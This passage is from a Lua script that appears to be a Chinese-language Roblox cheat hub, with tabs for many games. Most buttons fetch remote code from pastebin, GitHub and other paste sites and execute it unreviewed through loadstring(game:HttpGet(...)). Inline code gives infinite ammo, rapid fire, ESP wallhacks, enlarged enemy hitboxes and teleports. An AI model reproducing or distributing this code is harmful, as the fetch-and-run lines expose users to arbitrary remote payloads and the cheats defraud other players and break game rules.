                        game:GetService("Players").LocalPlayer.ninjaEvent:FireServer(oh1, oh2[i].Name)
                    end
                end
                if not autobuyranks then
                    break
                end
            end
        end
    )
end
autobuyskill = false
function buyskill()
    spawn(
        function()
            while autobuyskill == true do
                task.wait()
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    local oh1 = "buyAllSkills"
                    local oh2 = {
                        "Ground",
                        "Astral Island",
                        "Space Island",
                        "Tundra Island",
                        "Eternal Island",
                        "Sandstorm",
                        "Thunderstorm",
                        "Ancient Inferno Island",
                        "Midnight Shadow Island",
                        "Mythical Souls Island",
                        "Winter Wonder Island"
                    }
                    for i = 1, #oh2 do
                        game:GetService("Players").LocalPlayer.ninjaEvent:FireServer(oh1, oh2[i])
                    end
                end
                if not autobuyskill then
                    break
                end
            end
        end
    )
end
autobuyshurikens = false
function buyshurikens()
    spawn(
        function()
            while autobuyshurikens == true do
                task.wait()
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    local oh1 = "buyAllShurikens"
                    local oh2 = {
                        "Ground",
                        "Astral Island",
                        "Space Island",
                        "Tundra Island",
                        "Eternal Island",
                        "Sandstorm",
                        "Thunderstorm",
                        "Ancient Inferno Island",
                        "Midnight Shadow Island",
                        "Mythical Souls Island",
                        "Winter Wonder Island"
                    }
                    for i = 1, #oh2 do
                        game:GetService("Players").LocalPlayer.ninjaEvent:FireServer(oh1, oh2[i])
                    end
                end
                if not autobuyshurikens then
                    break
                end
            end
        end
    )
end

local Section = Tab:AddSection({
	Name = "自动赚"
})
Tab:AddToggle(
    {
        Name = "自动挥舞",
        Default = false,
        Callback = function(x)
            autoswing = x
            if autoswing then
                swinging()
            end
        end
    }
)

Tab:AddToggle(
    {
        Name = "自动售卖",
        Default = false,
        Callback = function(x)
            autosell = x
            if autosell then
                selling()
            end
        end
    }
)
    
Tab:AddToggle(
    {
        Name = "存满了自动售卖",
        Default = false,
        Callback = function(x)
            autosellmax = x
            if autosellmax then
                maxsell()
            end
        end
    }
)

local Section = Tab:AddSection({
	Name = "自动购买功能"
})

Tab:AddToggle(
    {
        Name = "自动购买剑",
        Default = false,
        Callback = function(x)
            autobuyswords = x
            if autobuyswords then
                buyswords()
            end
        end
    }
)

Tab:AddToggle(
    {
        Name = "自动购买腰带",
        Default = false,
        Callback = function(x)
            autobuybelts = x
            if autobuybelts then
                buybelts()
            end
        end
    }
)

Tab:AddToggle(
    {
        Name = "自动购买称号（等级）",
        Default = false,
        Callback = function(x)
            autobuyranks = x
            if autobuyranks then
                buyranks()
            end
        end
    }
)

Tab:AddToggle(
    {
        Name = "自动购买忍术",
        Default = false,
        Callback = function(x)
            autobuyskill = x
            if autobuyskill then
                buyskill()
            end
        end
    }
)

Tab:AddToggle(
    {
        Name = "自动购买（全部打开）",
        Default = false,
        Callback = function(x)
            autobuyshurikens = x
            if autobuyshurikens then
                buyshurikens()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "解锁所有岛",
        Callback = function()
            for _, v in next, game.workspace.islandUnlockParts:GetChildren() do
                if v then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.islandSignPart.CFrame
                    wait(.5)
                end
            end
        end
    }
)

Tab:AddButton({
  Name = "吸所有环",
  Callback = function()
      LS.hoops = state
    if LS.hoops then
        while LS.hoops do
            for i, v in ipairs(workspace.Hoops:GetChildren()) do
                if v.Name == "Hoop" then
                    v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                end
            end
            wait()
            for i, v in ipairs(workspace.Hoops.Hoop:GetChildren()) do
                if v.Name == "touchPart" then
                    v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                end
            end
        end
    end
  end
})

Tab:AddButton({
  Name = "获取所有元素",
  Callback = function()
      if game:GetService("ReplicatedStorage") and game:GetService("ReplicatedStorage").Elements and game.ReplicatedStorage and game.ReplicatedStorage.rEvents and game.ReplicatedStorage.rEvents.elementMasteryEvent then
        for i, v in pairs(game:GetService("ReplicatedStorage").Elements:GetChildren()) do
            local allelement = v.Name
            game.ReplicatedStorage.rEvents.elementMasteryEvent:FireServer(allelement)
        end
    end
  end
})

Tab:AddButton({
	Name = "死亡宠物",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4593.21337890625, 130.87181091308594, 1430.2239990234375)
	end
})

local Tab = Window:MakeTab({
    Name = "速度传奇",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/egMXJcwB", true))()
  end
})

Tab:AddButton({
    Name = "开启卡宠",
    Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/uR6azdQQ"))()
    end
})

Tab:AddButton({
    Name = "自动",
    Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/AyeCYbT6"))()
    end
})

local Section = Tab:AddSection({
        Name = "传送岛屿"
})

Tab:AddButton({
        Name = "返还出生岛",
        Callback = function()
        XA.Character.HumanoidRootPart.CFrame = CFrame.new(-9682.98828125, 58.87917709350586, 3099.033935546875)      
          end    
})

Tab:AddButton({
        Name = "白雪城",
        Callback = function()
        XA.Character.HumanoidRootPart.CFrame = CFrame.new(-9676.138671875, 58.87917709350586, 3782.69384765625)   
          end    
})

Tab:AddButton({
        Name = "熔岩城",
        Callback = function()
        XA.Character.HumanoidRootPart.CFrame = CFrame.new(-11054.96875, 216.83917236328125, 4898.62841796875)       
          end    
})

Tab:AddButton({
        Name = "传奇公路",
        Callback = function()
    XA.Character.HumanoidRootPart.CFrame = CFrame.new(-13098.87109375, 216.83917236328125, 5907.6279296875)    
          end    
})

local Tab = Window:MakeTab({
    Name = "bf",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "1",
	Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/TirSANX/CrimsonHUB/main/C_Loader'))()
  	end
})

Tab:AddButton({
	Name = "2",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/OldBf"))()
  	end
})

Tab:AddButton({
	Name = "3",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
  	end
})

Tab:AddButton({
	Name = "4",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/plutoguy/Tiger-Hub/main/loader.lua"))()
  	end
})

Tab:AddButton({
	Name = "5",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/any/main/mbmxhub/0135"))()
  	end
})

Tab:AddButton({
  Name = "6",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/StringV2/StringHub/main/BF.txt", true))()
  end
})

Tab:AddButton({
  Name = "7",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/MTriet-Hub.lua"))()
  end
})

Tab:AddButton({
  Name = "8",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
  end
})

Tab:AddButton({
  Name = "W-azure无密匙",
  Callback = function()
  getgenv().Team = "Pirates"
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
  end
})

Tab:AddButton({
  Name = "刷钱",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/Chest_onoff"))()
  end
})

local Tab = Window:MakeTab({
    Name = "灭霸模拟器",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
      Name = "出生/复活的地方",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,153,-20)
      end
    })
    
Tab:AddButton({
      Name = "刷碎片/铸造的地方",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(20,115,-695)
      end
   })
   
Tab:AddButton({
      Name = "商店/升级武器的地方",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28,1061,1590)
      end
    })
    
Tab:AddButton({
      Name = "时间宝石的位置",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(444.5,117,443.5)
      end
    })
    
Tab:AddButton({
      Name = "空间宝石的位置",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-412,73,-444)
      end
    })
    
Tab:AddButton({
      Name = "现实宝石的位置",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-420,13,690)
      end
    })
    
Tab:AddButton({
      Name = "能量宝石怪的位置（建议开夜视）",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(433,55,-326)
      end
    })
    
Tab:AddButton({
      Name = "灭霸模拟器快速自杀",
      Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,-4985,99999)
      end
    })
    
local Tab = Window:MakeTab({
  Name = "国王遗产",
  Icon = "rbxassetid://7734068321",
  PremiumOnly = false
  })

Tab:AddButton({
	Name = "trick",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_one"))()
end
})

Tab:AddButton({
	Name = "ipper hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20Leagacy"))()
end
})

Tab:AddButton({
	Name = "Xenon Hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/legacy"))()
end
})

Tab:AddButton({
	Name = "lack",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.lua"))()
end
})

Tab:AddButton({
	Name = "yper hub",
	Callback = function()
repeat wait() until game:IsLoaded()loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/Hyper/main/script.lua"))() 
end
})

local Tab = Window:MakeTab({
	Name = "河北唐县",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/s20nni0h/raw"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
  end
})

Tab:AddButton({
  Name = "autofarm",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
  end
})

local Tab = Window:MakeTab({
    Name = "越狱",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/y8s1yEac",true))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/free"))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Introvert1337/Releases/master/JailbreakGrabber.lua"))()
  end
})

Tab:AddButton({
  Name = "5",
  Callback = function()
  loadstring(game:HttpGet("https://gist.githubusercontent.com/uncooI/e59031055ab468d023c14fcf5faae993/raw/02067759e38a40f9a21bf24067c95ecbc8a052b2/jailbreak%2520fly%2520infinite%2520jump"))()
  end
})

Tab:AddButton({
  Name = "6",
  Callback = function()
  loadstring(game:GetObjects("rbxassetid://3762448307")[1].Source)()
  end
})

Tab:AddButton({
  Name = "7",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/KuriWasTaken/Veriax/main/Verisions/1.1/Loader.lua"))()
  end
})

Tab:AddButton({
  Name = "抢劫",
  Callback = function ()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/free"))()
  end
})

Tab:AddButton({
  Name = "自瞄",
  Callback = function ()
loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
  end

})

Tab:AddButton({
  Name = "青",
  Callback = function ()
loadstring(game:HttpGet('https://rentry.co/ct293/raw'))()
  end

})

local Tab = Window:MakeTab({
    Name = "兵工厂",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Arsenal/MainFile"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnStefano/NexusHub/main/Main", true))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddButton({  
    Name = "无限子弹",
	Callback = function()
	print("...");while wait() do

        game:GetService("Players").LocalPlayer.PlayerGui.GUI.Client.Variables.ammocount.Value = 999

        game:GetService("Players").LocalPlayer.PlayerGui.GUI.Client.Variables.ammocount2.Value = 999

    end
	end
})

Tab:AddButton({  
    Name = "快速射击",
	Callback = function()
	local replicationstorage = game.ReplicatedStorage

for i, v in pairs(replicationstorage.Weapons:GetDescendants()) do

   if v.Name == "Auto" then

       v.Value = true

   end

   if v.Name == "RecoilControl" then

       v.Value = 0

   end

   if v.Name == "MaxSpread" then

       v.Value = 0

   end

   if v.Name == "ReloadTime" then

      v.Value = 0

   end

   if v.Name == "FireRate" then

       v.Value = 0.05

   end

   if v.Name == "Crit" then

       v.Value = 20

   end

end
	end
})

Tab:AddButton({  
    Name = "显示人物",
	Callback = function()
	print("...");_G.FriendColor = Color3.fromRGB(0, 0, 255)
_G.EnemyColor = Color3.fromRGB(255, 0, 0)
_G.UseTeamColor = true

--------------------------------------------------------------------
local Holder = Instance.new("Folder", game.CoreGui)
Holder.Name = "ESP"

local Box = Instance.new("BoxHandleAdornment")
Box.Name = "nilBox"
Box.Size = Vector3.new(1, 2, 1)
Box.Color3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Box.Transparency = 0.7
Box.ZIndex = 0
Box.AlwaysOnTop = false
Box.Visible = false

local NameTag = Instance.new("BillboardGui")
NameTag.Name = "nilNameTag"
NameTag.Enabled = false
NameTag.Size = UDim2.new(0, 200, 0, 50)
NameTag.AlwaysOnTop = true
NameTag.StudsOffset = Vector3.new(0, 1.8, 0)
local Tag = Instance.new("TextLabel", NameTag)
Tag.Name = "Tag"
Tag.BackgroundTransparency = 1
Tag.Position = UDim2.new(0, -50, 0, 0)
Tag.Size = UDim2.new(0, 300, 0, 20)
Tag.TextSize = 15
Tag.TextColor3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Tag.TextStrokeColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
Tag.TextStrokeTransparency = 0.4
Tag.Text = "nil"
Tag.Font = Enum.Font.SourceSansBold
Tag.TextScaled = false

local LoadCharacter = function(v)
	repeat wait() until v.Character ~= nil
	v.Character:WaitForChild("Humanoid")
	local vHolder = Holder:FindFirstChild(v.Name)
	vHolder:ClearAllChildren()
	local b = Box:Clone()
	b.Name = v.Name .. "Box"
	b.Adornee = v.Character
	b.Parent = vHolder
	local t = NameTag:Clone()
	t.Name = v.Name .. "NameTag"
	t.Enabled = true
	t.Parent = vHolder
	t.Adornee = v.Character:WaitForChild("Head", 5)
	if not t.Adornee then
		return UnloadCharacter(v)
	end
	t.Tag.Text = v.Name
	b.Color3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	t.Tag.TextColor3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	local Update
	local UpdateNameTag = function()
		if not pcall(function()
			v.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			local maxh = math.floor(v.Character.Humanoid.MaxHealth)
			local h = math.floor(v.Character.Humanoid.Health)
		end) then
			Update:Disconnect()
		end
	end
	UpdateNameTag()
	Update = v.Character.Humanoid.Changed:Connect(UpdateNameTag)
end

local UnloadCharacter = function(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder and (vHolder:FindFirstChild(v.Name .. "Box") ~= nil or vHolder:FindFirstChild(v.Name .. "NameTag") ~= nil) then
		vHolder:ClearAllChildren()
	end
end

local LoadPlayer = function(v)
	local vHolder = Instance.new("Folder", Holder)
	vHolder.Name = v.Name
	v.CharacterAdded:Connect(function()
		pcall(LoadCharacter, v)
	end)
	v.CharacterRemoving:Connect(function()
		pcall(UnloadCharacter, v)
	end)
	v.Changed:Connect(function(prop)
		if prop == "TeamColor" then
			UnloadCharacter(v)
			wait()
			LoadCharacter(v)
		end
	end)
	LoadCharacter(v)
end

local UnloadPlayer = function(v)
	UnloadCharacter(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder then
		vHolder:Destroy()
	end
end

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
	spawn(function() pcall(LoadPlayer, v) end)
end

game:GetService("Players").PlayerAdded:Connect(function(v)
	pcall(LoadPlayer, v)
end)

game:GetService("Players").PlayerRemoving:Connect(function(v)
	pcall(UnloadPlayer, v)
end)

game:GetService("Players").LocalPlayer.NameDisplayDistance = 0

if _G.Reantheajfdfjdgs then
    return
end

_G.Reantheajfdfjdgs = ":suifayhgvsdghfsfkajewfrhk321rk213kjrgkhj432rj34f67df"

local players = game:GetService("Players")
local plr = players.LocalPlayer

function esp(target, color)
    if target.Character then
        if not target.Character:FindFirstChild("GetReal") then
            local highlight = Instance.new("Highlight")
            highlight.RobloxLocked = true
            highlight.Name = "GetReal"
            highlight.Adornee = target.Character
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.FillColor = color
            highlight.Parent = target.Character
        else
            target.Character.GetReal.FillColor = color
        end
    end
end

while task.wait() do
    for i, v in pairs(players:GetPlayers()) do
        if v ~= plr then
            esp(v, _G.UseTeamColor and v.TeamColor.Color or ((plr.TeamColor == v.TeamColor) and _G.FriendColor or _G.EnemyColor))
        end
    end
end
	end
})

Tab:AddButton({  
    Name = "子弹追踪",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenal"))()
	end
})

Tab:AddButton({
  Name = "锁头",
  Callback = function()
  function getplrsname() for i,v in pairs(game:GetChildren()) do if v.ClassName == "Players" then return v.Name end end end local players = getplrsname() local plr = game[players].LocalPlayer coroutine.resume(coroutine.create(function() while wait(1) do coroutine.resume(coroutine.create(function() for _,v in pairs(game[players]:GetPlayers()) do if v.Name ~= plr.Name and v.Character then v.Character.RightUpperLeg.CanCollide = false v.Character.RightUpperLeg.Transparency = 10 v.Character.RightUpperLeg.Size = Vector3.new(30,30,30) v.Character.LeftUpperLeg.CanCollide = false v.Character.LeftUpperLeg.Transparency = 10 v.Character.LeftUpperLeg.Size = Vector3.new(30,30,30) v.Character.HeadHB.CanCollide = false v.Character.HeadHB.Transparency = 10 v.Character.HeadHB.Size = Vector3.new(30,30,30) v.Character.HumanoidRootPart.CanCollide = false v.Character.HumanoidRootPart.Transparency = 10 v.Character.HumanoidRootPart.Size = Vector3.new(30,30,30) end end end)) end end))
  end
})

local Tab = Window:MakeTab({
    Name = "监狱人生",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "手里剑秒杀",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/jian"))()
  	end
})

Tab:AddButton({
	Name = "变车模型",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/zLe3e4BS"))()
  	end
})

Tab:AddButton({
  Name = "变钢铁侠",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/7prijqYH"))()
  end
})

Tab:AddButton({
  Name = "杀所有人(不可关)",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/kXjfpFPh"))()
  end
})

Tab:AddButton({
	Name = "无敌模式",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/LdTVujTA"))()
  	end
})

Tab:AddButton({
	Name = "警卫室",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(847.7261352539062, 98.95999908447266, 2267.387451171875)
  	end
})

Tab:AddButton({
	Name = "监狱室内",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(919.2575073242188, 98.95999908447266, 2379.74169921875)
  	end
})

Tab:AddButton({
	Name = "罪犯复活点",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-937.5891723632812, 93.09876251220703, 2063.031982421875)
  	end
})

Tab:AddButton({
	Name = "监狱室外",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(760.6033325195312, 96.96992492675781, 2475.405029296875)
  	end
})

Tab:AddButton({
	Name = "超强指令",
	Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/Asddffgujhh/-/refs/heads/main/%E7%9B%91%E7%8B%B1%E4%BA%BA%E7%94%9F%E8%B6%85%E5%BC%BA%E6%8C%87%E4%BB%A4'))()
  	end
})

local Tab = Window:MakeTab({
    Name = "动感星期五",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "1",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
  	end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-Auto-Player-Mobile-6721"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
  end
})

local Tab = Window:MakeTab({
    Name = "战争大亨",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "1",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/War-Tycoon/main/Script"))()
  	end
})

Tab:AddButton({
	Name = "乌托邦战争大亨",
	Callback = function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/USA868/-/refs/heads/main/.github/workflows/%E6%88%98%E4%BA%89%E5%A4%A7%E4%BA%A8.lua'))()
  	end
})

Tab:AddButton({
	Name = "一枪秒人",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/6b4XEjQF'))()
  	end
})

local Tab = Window:MakeTab({
    Name = "冰上钓鱼模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "1",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/refs/heads/main/bingshangdiaofish.lua"))()
  	end
})

local Tab = Window:MakeTab({
    Name = "bf",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "1",
	Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/TirSANX/CrimsonHUB/main/C_Loader'))()
  	end
})

Tab:AddButton({
	Name = "2",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/OldBf"))()
  	end
})

Tab:AddButton({
	Name = "3",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
  	end
})

Tab:AddButton({
	Name = "4",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/plutoguy/Tiger-Hub/main/loader.lua"))()
  	end
})

Tab:AddButton({
	Name = "5",
	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/any/main/mbmxhub/0135"))()
  	end
})

Tab:AddButton({
  Name = "6",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
  end
})

Tab:AddButton({
  Name = "7",
  Callback = function()
  loadstring(game:HttpGet"https://raw.githubusercontent.com/Basicallyy/Basicallyy/main/MinGamingV4.lua")()
  end
})

Tab:AddButton({
  Name = "8",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
  end
})

Tab:AddButton({
  Name = "9",
  Callback = function()
  loadstring(game:HttpGet("https://https://h.lkmc.asia/script/MTHub.lua"))()
  end
})

Tab:AddButton({
  Name = "秒杀",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/StringV2/StringHub/main/BF.txt", true))()
  end
})

Tab:AddButton({
  Name = "自动升级脚本",
  Callback = function()
  loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
  end
})

Tab:AddButton({
  Name = "海贼王汉化",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Xiao-Yun-UWU/main/%E6%B5%B7%E8%B4%BC%E7%8E%8Bbf.lua", true))()
  end
})

local Tab = Window:MakeTab({
  Name = "进击的僵尸",
  Icon = "rbxassetid://7734068321",
  PremiumOnly = false
  })
  
Tab:AddButton({
	Name = "进击的僵尸",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Zombie%20Attack", true))()
	end
})

local Tab = Window:MakeTab({
  Name = "战斗勇士",
  Icon = "rbxassetid://7734068321",
  PremiumOnly = false
  })

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://paste.gg/p/anonymous/697fc3cad5f743508318cb7399e89432/files/b5923e52edab4e5c91e46b74563d0ae8/raw"))()
  end
})

Tab:AddButton({
  Name = "Hydra Hub V2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/frkfx/Combat-Warriors/main/Script"))()
  end
})

local Tab = Window:MakeTab({
	Name = "鲨口求生2",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddDropdown({
	Name = "免费船只",
	Default = "1",
	Options = {"鸭子船bat", "鸭子船", "蓝色汽艇", "蓝木摩托艇", "独角兽船", "Jetski", "红马", "单桅帆船", "拖船", "小型游艇", "JetskiDonut", "马林鱼", "管状船", "渔船", "海盗船", "小型木制帆船", "红色摩托艇", "双体船", "战斗艇", "旅游船", "鸭子海洋生物", "派对船", "军用潜艇",  "姜饼轮船", "雪橇2022", "雪地车", "游轮"},
	Callback = function(Value)
local ohString1 = (Value)
game:GetService("ReplicatedStorage").EventsFolder.BoatSelection.UpdateHostBoat:FireServer(ohString1)
	end
})
Tab:AddButton({
	Name = "自动杀鲨鱼",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Misc%20Scripts/sharkbite2.lua",true))()
  	end
})

local Tab = Window:MakeTab({
    Name = "Evade",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/9Strew/roblox/main/gamescripts/evade.lua'))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/OneProtocol/Project/main/Loader", true))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
  end
})

local Tab = Window:MakeTab({
	Name = "CW",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "无限体力",
  Callback = function()
loadstring(game:HttpGet("https://shz.al/~KSK"))()
  end
})

Tab:AddButton({
    Name = "锁头",
    Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/6RQGbFqD"))()
    end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
loadstring(game:HttpGet("https://paste.gg/p/anonymous/697fc3cad5f743508318cb7399e89432/files/b5923e52edab4e5c91e46b74563d0ae8/raw"))()
  end
})

local Tab = Window:MakeTab({
	Name = "一路向西",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/Drifter0507/scripts/main/westbound"),true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
loadstring(game:GetObjects("rbxassetid://773377961010144323913")[1].Source)()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/lyyanai/westbound/main/script"))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:GetObjects("rbxassetid://10040701935")[1].Source)()
  end
})

Tab:AddButton({
  Name = "防摔",
  Callback = function()
  loadstring(game:GetObjects("rbxassetid://10040712770")[1].Source)()
  end
})

local Tab = Window:MakeTab({
    Name = "刀刃球",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({ 
	Name = "1(需卡密)",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/BetaTest/Bladeball15m.html'))()
  	end
})

Tab:AddButton({
